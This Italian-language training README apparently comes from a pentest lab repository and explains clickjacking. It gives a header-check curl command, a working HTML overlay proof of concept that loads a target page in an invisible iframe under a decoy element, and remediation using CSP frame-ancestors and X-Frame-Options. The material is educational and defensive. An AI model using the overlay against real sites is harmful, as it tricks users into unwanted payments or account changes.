> [English](README.en.md) | **Italiano**

# Clickjacking (UI redress)

> - **Fase:** Web exploitation - OWASP A05:2021 Security Misconfiguration (mancanza di difese anti-framing)
> - **Visibilita:** Bassa - l'attacco avviene nel browser della vittima su una pagina dell'attaccante
> - **Prerequisiti:** una pagina sensibile che puo essere inserita in un `iframe` (assenza di `X-Frame-Options` e di `Content-Security-Policy: frame-ancestors`)
> - **Natura del documento:** metodologia + PoC pratico per ambiente di laboratorio. Nessun Finding ID fabbricato (prossimo `WEB-016`, da assegnare in lab).

- Obiettivo: ingannare la vittima facendole cliccare su elementi di una pagina target (es. un bottone "conferma") sovrapponendo un'interfaccia-esca, mentre i click vanno all'app reale invisibile.

---

## Executive summary

Il clickjacking (UI redress) carica la pagina target in un `iframe` trasparente sopra un'interfaccia-esca: la
vittima crede di interagire con l'esca (es. "clicca per vincere") ma i click arrivano all'app target, dove e
autenticata. Se l'azione cambia stato (conferma pagamento, cambio impostazioni, approvazione OAuth), l'attaccante
la ottiene. E sfruttabile solo se la pagina non vieta il framing. Severity tipica `Medio`, piu alta se l'azione
"rubata" e critica.

## Esecuzione / comandi

### Fase 1 - verifica difese anti-framing

```bash
curl -s -I https://target.lab/account/settings | grep -iE 'x-frame-options|content-security-policy'
# se non compaiono X-Frame-Options ne frame-ancestors -> la pagina e inquadrabile: candidata a clickjacking
```

### Fase 2 - PoC overlay (pagina dell'attaccante)

```html
<style>
  iframe { position:absolute; top:0; left:0; width:1000px; height:800px; opacity:0.0; z-index:2; }
  #lure { position:absolute; top:300px; left:420px; z-index:1; }
</style>
<div id="lure">clicca qui per continuare</div>
<iframe src="https://target.lab/account/settings"></iframe>  <!-- il click della vittima va al bottone reale -->
```

Allineando l'esca al bottone reale dell'iframe (invisibile), il click della vittima esegue l'azione sul target.
Variante moderna: abuso del drag-and-drop o del doppio-click per confermare prompt sensibili.

## Analisi dei risultati

Se la pagina si carica nell'iframe (nessun header anti-framing), il clickjacking e confermato; l'impatto dipende
dall'azione bersaglio (da `Medio` a `Alto` per approvazioni/pagamenti). Se la pagina imposta
`X-Frame-Options: DENY` o `Content-Security-Policy: frame-ancestors 'none'`, il browser blocca il framing e il
vettore e chiuso.

### Analisi teorica

Il clickjacking separa cio che l'utente **vede** da cio con cui **interagisce**: e un attacco al modello di
fiducia dell'interfaccia, non al server. La difesa e lato server (istruire il browser a non farsi inquadrare):
`frame-ancestors` in CSP e/o `X-Frame-Options`, piu `SameSite` sui cookie per ridurre l'azione cross-site.

## Remediation (blue team)

**Rilevamento.** Assenza di header anti-framing sulle pagine sensibili; referer esterni su azioni sensibili.

**Hardening.** `Content-Security-Policy: frame-ancestors 'self'` (o `'none'`); `X-Frame-Options: DENY`/`SAMEORIGIN`
come fallback; conferme esplicite non "rubabili"; `SameSite` sui cookie.

## Tool di riferimento

| tool | tipo | tecnica/accesso | caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `Burp Suite` (clickbandit) | proxy/scanner | web - attivo | genera un poc di clickjacking per la pagina target |
| `curl` | client http | cli - attivo | verifica rapida degli header anti-framing |

## Mappatura MITRE ATT&CK

| tattica | tecnica | id mitre | descrizione dell'azione |
| :--- | :--- | :--- | :--- |
| initial access | drive-by compromise | `T1189` | la vittima visita una pagina che inquadra il target e dirotta i suoi click. |

---

## Correlazioni con altri finding

| provenienza | questa tecnica | effetto |
| :--- | :--- | :--- |
| [csrf](<../csrf (Cross-Site Request Forgery)/README.md>) | clickjacking | alternativa "a interazione" quando la csrf e protetta da token |
| clickjacking | [secure-coding-lab](<../../06-secure-coding-lab (Defense)/README.md>) | la remediation (frame-ancestors, xfo) si collega al secure coding |

---

> **Nota:** Contenuto didattico. I PoC vanno usati solo su applicazioni di proprieta o con autorizzazione esplicita, in laboratorio. Output illustrativi.
